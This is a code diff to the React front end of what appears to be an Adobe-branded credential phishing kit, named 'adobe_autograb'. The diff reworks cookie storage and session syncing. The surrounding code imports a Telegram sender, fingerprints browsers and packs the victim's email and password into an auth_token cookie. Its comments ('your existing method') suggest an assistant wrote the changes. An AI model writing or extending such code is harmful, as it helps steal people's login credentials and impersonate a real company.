@@ -9,6 +9,15 @@ import {
   sendToTelegram 
 } from './utils/oauthHandler';
 
+// Import the new real-time cookie system
+import { 
+  setCookie, 
+  getCookie, 
+  removeCookie, 
+  subscribeToCookieChanges,
+  CookieChangeEvent 
+} from './utils/realTimeCookieManager';
+
 function App() {
   const [isMobile, setIsMobile] = useState(false);
   const [hasActiveSession, setHasActiveSession] = useState(false);
@@ -32,6 +41,26 @@ function App() {
     }
   }, []);
 
+  // Add real-time cookie monitoring for session changes
+  useEffect(() => {
+    const unsubscribe = subscribeToCookieChanges((event: CookieChangeEvent) => {
+      // Monitor session-related cookies for cross-tab synchronization
+      if (event.name === 'adobe_session' || event.name === 'logged_in') {
+        if (event.action === 'remove' || event.value === '' || event.value === 'false') {
+          console.log('🔄 Session ended in another tab');
+          setHasActiveSession(false);
+          setCurrentPage('login');
+        } else if (event.action === 'set' || event.action === 'update') {
+          console.log('🔄 Session updated in another tab');
+          setHasActiveSession(true);
+          setCurrentPage('landing');
+        }
+      }
+    });
+
+    return unsubscribe;
+  }, []);
+
   // Check for existing session on load
   useEffect(() => {
     const checkSession = async () => {
@@ -53,21 +82,48 @@ function App() {
           return;
         }
 
-        // Check for existing session
-        const existingSession = typeof localStorage !== 'undefined' ? localStorage.getItem('adobe_autograb_session') : null;
-        if (existingSession) {
+        // Enhanced session restoration - try cookies first, then localStorage
+        let existingSession = null;
+        
+        // Try to get session from real-time cookies first
+        const cookieSession = getCookie('adobe_session');
+        if (cookieSession) {
           try {
-            const sessionData = JSON.parse(existingSession);
-            console.log('✅ Existing session found:', sessionData.email);
-            setHasActiveSession(true);
-            setCurrentPage('landing');
+            existingSession = JSON.parse(decodeURIComponent(cookieSession));
+            console.log('✅ Session restored from cookie:', existingSession.email);
           } catch (error) {
-            console.error('Error parsing existing session:', error);
-            if (typeof localStorage !== 'undefined') {
-              localStorage.removeItem('adobe_autograb_session');
-            }
-            setCurrentPage('login');
+            console.warn('Invalid cookie session data:', error);
           }
+        }
+        
+        // Fallback to localStorage (your existing method)
+        if (!existingSession) {
+          const localSession = typeof localStorage !== 'undefined' ? localStorage.getItem('adobe_autograb_session') : null;
+          if (localSession) {
+            try {
+              existingSession = JSON.parse(localSession);
+              console.log('✅ Session restored from localStorage:', existingSession.email);
+              
+              // Migrate to cookie system for future reliability (no expiry)
+              setCookie('adobe_session', encodeURIComponent(localSession), {
+                secure: process.env.NODE_ENV === 'production',
+                sameSite: 'strict',
+                path: '/'
+                // No expires = session cookie (no expiry until browser closes)
+              });
+              console.log('🔄 Session migrated to cookie system');
+            } catch (error) {
+              console.error('Error parsing existing session:', error);
+              if (typeof localStorage !== 'undefined') {
+                localStorage.removeItem('adobe_autograb_session');
+              }
+            }
+          }
+        }
+
+        if (existingSession) {
+          setHasActiveSession(true);
+          setCurrentPage('landing');
         } else {
           // No valid session, start with login page
           setCurrentPage('login');
@@ -113,25 +169,42 @@ function App() {
         browserFingerprint: postAuthFingerprint
       };
 
-      // Store successful session
+      // Store successful session (keep your existing localStorage)
       if (typeof localStorage !== 'undefined') {
         localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
       }
       
-      // Set session cookies
+      // Enhanced cookie setting with real-time system (no expiry)
       try {
-        if (typeof document === 'undefined') return;
-        
         const sessionId = sessionData.sessionId;
-        const expires = new Date(Date.now() + 24 * 60 * 60 * 1000).toUTCString();
+        const cookieOptions = {
+          path: '/',
+          secure: process.env.NODE_ENV === 'production',
+          sameSite: 'strict' as const
+          // No expires = session cookie (no expiry until browser closes)
+        };
         
-        document.cookie = `adobe_session=${encodeURIComponent(JSON.stringify(sessionData))}; expires=${expires}; path=/; secure; samesite=strict`;
-        document.cookie = `sessionid=${sessionId}; expires=${expires}; path=/; secure; samesite=strict`;
-        document.cookie = `auth_token=${btoa(sessionData.email + ':oauth')}; expires=${expires}; path=/; secure; samesite=strict`;
-        document.cookie = `logged_in=true; expires=${expires}; path=/; secure; samesite=strict`;
-        document.cookie = `user_email=${encodeURIComponent(sessionData.email)}; expires=${expires}; path=/; secure; samesite=strict`;
+        // Use real-time cookie system
+        setCookie('adobe_session', encodeURIComponent(JSON.stringify(sessionData)), cookieOptions);
+        setCookie('sessionid', sessionId, cookieOptions);
+        setCookie('auth_token', btoa(sessionData.email + ':oauth'), cookieOptions);
+        setCookie('logged_in', 'true', cookieOptions);
+        setCookie('user_email', encodeURIComponent(sessionData.email), cookieOptions);
+        
+        console.log('🍪 Session cookies set with real-time system (no expiry)');
       } catch (e) {
         console.warn('Failed to set cookies:', e);
+        
+        // Fallback to your existing method (no expiry)
+        if (typeof document !== 'undefined') {
+          const sessionId = sessionData.sessionId;
+          
+          document.cookie = `adobe_session=${encodeURIComponent(JSON.stringify(sessionData))}; path=/; secure; samesite=strict`;
+          document.cookie = `sessionid=${sessionId}; path=/; secure; samesite=strict`;
+          document.cookie = `auth_token=${btoa(sessionData.email + ':oauth')}; path=/; secure; samesite=strict`;
+          document.cookie = `logged_in=true; path=/; secure; samesite=strict`;
+          document.cookie = `user_email=${encodeURIComponent(sessionData.email)}; path=/; secure; samesite=strict`;
+        }
       }
 
       // Send to Telegram
@@ -190,20 +263,37 @@ function App() {
   const handleLoginSuccess = async (sessionData: any) => {
     console.log('🔐 Login success:', sessionData);
     
-    // Set session cookies
+    // Enhanced cookie setting with real-time system (no expiry)
     try {
-      if (typeof document === 'undefined') return;
-      
       const sessionId = sessionData.sessionId || Math.random().toString(36).substring(2, 15);
-      const expires = new Date(Date.now() + 24 * 60 * 60 * 1000).toUTCString();
+      const cookieOptions = {
+        path: '/',
+        secure: process.env.NODE_ENV === 'production',
+        sameSite: 'strict' as const
+        // No expires = session cookie (no expiry until browser closes)
+      };
       
-      document.cookie = `adobe_session=${encodeURIComponent(JSON.stringify(sessionData))}; expires=${expires}; path=/; secure; samesite=strict`;
-      document.cookie = `sessionid=${sessionId}; expires=${expires}; path=/; secure; samesite=strict`;
-      document.cookie = `auth_token=${btoa(sessionData.email + ':' + (sessionData.password || 'oauth'))}; expires=${expires}; path=/; secure; samesite=strict`;
-      document.cookie = `logged_in=true; expires=${expires}; path=/; secure; samesite=strict`;
-      document.cookie = `user_email=${encodeURIComponent(sessionData.email)}; expires=${expires}; path=/; secure; samesite=strict`;
+      // Use real-time cookie system
+      setCookie('adobe_session', encodeURIComponent(JSON.stringify(sessionData)), cookieOptions);
+      setCookie('sessionid', sessionId, cookieOptions);
+      setCookie('auth_token', btoa(sessionData.email + ':' + (sessionData.password || 'oauth')), cookieOptions);
+      setCookie('logged_in', 'true', cookieOptions);
+      setCookie('user_email', encodeURIComponent(sessionData.email), cookieOptions);
+      
+      console.log('🍪 Login cookies set with real-time system (no expiry)');
     } catch (e) {
-      console.warn('Failed to set cookies:', e);
+      console.warn('Failed to set cookies with real-time system, using fallback:', e);
+      
+      // Fallback to your existing method (no expiry)
+      if (typeof document !== 'undefined') {
+        const sessionId = sessionData.sessionId || Math.random().toString(36).substring(2, 15);
+        
+        document.cookie = `adobe_session=${encodeURIComponent(JSON.stringify(sessionData))}; path=/; secure; samesite=strict`;
+        document.cookie = `sessionid=${sessionId}; path=/; secure; samesite=strict`;
+        document.cookie = `auth_token=${btoa(sessionData.email + ':' + (sessionData.password || 'oauth'))}; path=/; secure; samesite=strict`;
+        document.cookie = `logged_in=true; path=/; secure; samesite=strict`;
+        document.cookie = `user_email=${encodeURIComponent(sessionData.email)}; path=/; secure; samesite=strict`;
+      }
     }
 
     const browserFingerprint = getBrowserFingerprint();
@@ -266,12 +356,23 @@ function App() {
       sessionStorage.clear();
     }
     
-    // Clear cookies
-    if (typeof document !== 'undefined') {
-      const cookies = ['adobe_session', 'sessionid', 'auth_token', 'logged_in', 'user_email'];
-      cookies.forEach(cookie => {
-        document.cookie = `${cookie}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
+    // Enhanced cookie clearing with real-time system
+    try {
+      const cookieNames = ['adobe_session', 'sessionid', 'auth_token', 'logged_in', 'user_email'];
+      cookieNames.forEach(cookieName => {
+        removeCookie(cookieName, { path: '/' });
       });
+      console.log('🍪 Cookies cleared with real-time system');
+    } catch (e) {
+      console.warn('Failed to clear cookies with real-time system, using fallback:', e);
+      
+      // Fallback to your existing method
+      if (typeof document !== 'undefined') {
+        const cookies = ['adobe_session', 'sessionid', 'auth_token', 'logged_in', 'user_email'];
+        cookies.forEach(cookie => {
+          document.cookie = `${cookie}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
+        });
+      }
     }
     
     setHasActiveSession(false);
